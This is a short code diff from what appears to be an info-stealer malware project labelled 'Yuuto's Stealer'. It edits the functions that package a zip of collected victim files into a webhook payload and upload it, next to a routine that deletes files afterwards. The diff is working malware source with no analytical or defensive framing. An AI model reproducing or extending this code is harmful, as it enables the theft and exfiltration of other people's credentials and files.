@@ -272,9 +272,9 @@ const json = async (zipFile) => {
     username: 'Yuuto\'s Stealer | https://github.com/JustYuuto/Yuuto-Stealer',
     attachments: [{
       id: 0,
-      filename: zipFile?.split(sep)?.pop(),
+      filename: zipFile,
       content_type: 'application/zip',
-      url: `attachment://${zipFile?.split(sep)?.pop()}`,
+      url: `attachment://${zipFile}`,
     }]
   };
 };
@@ -282,7 +282,7 @@ const json = async (zipFile) => {
 const send = async (zipFile) => {
   const data = new FormData();
   data.append('files[0]', fs.createReadStream(zipFile));
-  data.append('payload_json', JSON.stringify(await json(zipFile)));
+  data.append('payload_json', JSON.stringify(await json(zipFile?.split(sep)?.pop())));
 
   const deleteFiles = async () => {
     try {
